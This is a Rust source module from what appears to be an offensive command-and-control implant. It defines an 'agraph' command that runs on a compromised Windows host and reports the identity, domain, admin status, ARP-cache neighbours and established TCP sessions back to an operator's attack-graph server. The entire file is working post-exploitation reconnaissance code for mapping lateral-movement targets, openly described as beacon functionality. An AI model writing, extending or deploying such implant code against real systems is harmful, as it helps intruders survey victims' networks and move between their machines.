//! attack_graph/mod.rs — attack-graph node evidence collector (v8, Phase D)
//!
//! WHAT: one inline command — `agraph` — that enriches THIS compromised
//! machine's node in the operator's Attack Graph (ui/graph/AttackGraphWindow.java):
//!   • identity: user@host, domain, elevation, os/arch/pid
//!   • ARP cache neighbors (GetIpNetTable) → "this machine TALKED to these
//!     hosts" — the honest lateral-movement edges (T1046/T1018 evidence)
//!   • established TCP sessions (GetTcpTable, state==ESTABLISHED) → live
//!     SMB/RPC/WinRM-style connections for edge weighting
//!
//! The server (graph.go) stores the JSON per session and splices the
//! neighbors into the graph as `net:<ip>` nodes with `arp`/`tcp` edges.
//!
//! WHY NOT MORE: everything here is memory-table reading — no network
//! traffic generated, no process spawned, nothing injected. Discovery that
//! TOUCHES the network already exists elsewhere (admap, BOFs: dcfinder,
/// localadmins, netsessions) and stays operator-triggered, never automatic.

use serde_json::{json, Value};

pub mod ffi {
    //! Minimal iphlpapi/shell32 surface — shared with ad_map/ffi.rs by value
    //! (tiny, stable); kept local so this module stays self-contained
    //! (file-count budget: 1-6 files per folder, framework rule).

    #![allow(non_snake_case)]
    #![allow(dead_code)]

    pub const MIB_TCP_STATE_ESTAB: u32 = 5;

    #[cfg(target_os = "windows")]
    #[link(name = "iphlpapi")]
    extern "system" {
        pub fn GetIpNetTable(
            IpNetTable: *mut core::ffi::c_void,
            pdwSize:    *mut u32,
            bOrder:     u32,
        ) -> u32;

        pub fn GetTcpTable(
            pTcpTable: *mut core::ffi::c_void,
            pdwSize:   *mut u32,
            bOrder:    u32,
        ) -> u32;
    }

    #[cfg(target_os = "windows")]
    #[link(name = "shell32")]
    extern "system" {
        pub fn IsUserAnAdmin() -> i32;
    }

    pub fn u32_to_ip(v: u32) -> String {
        format!("{}.{}.{}.{}", v & 0xFF, (v >> 8) & 0xFF, (v >> 16) & 0xFF, (v >> 24) & 0xFF)
    }

    pub fn ntohs(v: u16) -> u16 {
        (v >> 8) | (v << 8)
    }

    pub unsafe fn from_ansi(p: *const u8) -> String {
        if p.is_null() { return String::new(); }
        let mut len = 0usize;
        while *p.add(len) != 0 { len += 1; }
        String::from_utf8_lossy(std::slice::from_raw_parts(p, len)).into_owned()
    }
}

/// Response caps — beacon envelope hygiene.
const MAX_ARP_ENTRIES: usize = 128;
const MAX_TCP_ENTRIES: usize = 128;

/// Entry point — `agraph` inline command. Returns (stdout_json, stderr).
pub fn run(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    {
        return (
            String::new(),
            "agraph: windows-only recon (no iphlpapi on this platform)".into(),
        );
    }

    #[cfg(target_os = "windows")]
    {
        run_windows()
    }
}

#[cfg(target_os = "windows")]
fn run_windows() -> (String, String) {
    use ffi::*;

    let mut api_errors: Vec<String> = Vec::new();

    // ── Identity ─────────────────────────────────────────────────────────
    let host = std::env::var("COMPUTERNAME").unwrap_or_default();
    let user = std::env::var("USERNAME").unwrap_or_default();
    // v9 FIX (fake-domain bug): USERDOMAIN on non-domain machines is just the
    // computer name (e.g. "LAPTOP-8QJ4A6AV") — the old code fell back to it
    // and the server then drew a phantom purple "domain" node with the host's
    // own name, duplicating the agent node. Domain membership is reported
    // from USERDNSDOMAIN ONLY: empty means "no domain" and the graph draws
    // no membership edge at all.
    let domain = std::env::var("USERDNSDOMAIN").unwrap_or_default();
    let is_admin = unsafe { IsUserAnAdmin() != 0 };

    // ── ARP cache → neighbors ────────────────────────────────────────────
    let mut arp: Vec<Value> = Vec::new();
    unsafe {
        let mut size: u32 = 65536;
        let mut buf = vec![0u8; size as usize];
        let rc = GetIpNetTable(buf.as_mut_ptr() as *mut _, &mut size, 1);
        if rc == 0 {
            let count = *(buf.as_ptr() as *const u32) as usize;
            // MIB_IPNETROW: index(4) phys_len(4) phys[8] addr(4) type(4) = 24
            for i in 0..count.min(MAX_ARP_ENTRIES) {
                let off = 4 + i * 24;
                if off + 24 > buf.len() { break; }
                let p = buf.as_ptr().add(off);
                let pa_len = *(p.add(4) as *const u32);
                let addr = *(p.add(16) as *const u32);
                let atype = *(p.add(20) as *const u32);
                // type: 1=dynamic 2=static 3=invalid 4=other — keep real neighbors
                if atype == 3 || pa_len == 0 { continue; }
                let mac = if pa_len <= 8 {
                    (0..pa_len).map(|j| format!("{:02X}", *p.add(8 + j as usize)))
                        .collect::<Vec<_>>().join("-")
                } else { String::new() };
                arp.push(json!({ "ip": u32_to_ip(addr), "mac": mac, "type": atype }));
            }
        } else {
            api_errors.push(format!("GetIpNetTable error {}", rc));
        }
    }

    // ── Established TCP sessions ─────────────────────────────────────────
    let mut tcp: Vec<Value> = Vec::new();
    unsafe {
        let mut size: u32 = 65536;
        let mut buf = vec![0u8; size as usize];
        let rc = GetTcpTable(buf.as_mut_ptr() as *mut _, &mut size, 1);
        if rc == 0 {
            let count = *(buf.as_ptr() as *const u32) as usize;
            // MIB_TCPROW: state(4) localAddr(4) localPort(4) remoteAddr(4) remotePort(4) = 20
            for i in 0..count {
                let off = 4 + i * 20;
                if off + 20 > buf.len() { break; }
                let p = buf.as_ptr().add(off);
                let state = *(p as *const u32);
                if state != MIB_TCP_STATE_ESTAB { continue; }
                if tcp.len() >= MAX_TCP_ENTRIES { break; }
                let laddr = u32_to_ip(*(p.add(4) as *const u32));
                let lport = ntohs(u16::from_ne_bytes([
                    *(p.add(8)), *(p.add(9))]));
                let raddr = u32_to_ip(*(p.add(12) as *const u32));
                let rport = ntohs(u16::from_ne_bytes([
                    *(p.add(16)), *(p.add(17))]));
                tcp.push(json!({
                    "local": format!("{}:{}", laddr, lport),
                    "remote": format!("{}:{}", raddr, rport),
                }));
            }
        } else {
            api_errors.push(format!("GetTcpTable error {}", rc));
        }
    }

    let out = json!({
        "kind": "attack_node",
        "host": host,
        "user": user,
        "domain": domain,
        "is_admin": is_admin,
        "os": std::env::consts::OS,
        "arch": std::env::consts::ARCH,
        "pid": std::process::id(),
        "arp": arp,
        "tcp_established": tcp,
        "error": api_errors.join("; "),
    });
    (serde_json::to_string(&out).unwrap_or_default(), String::new())
}
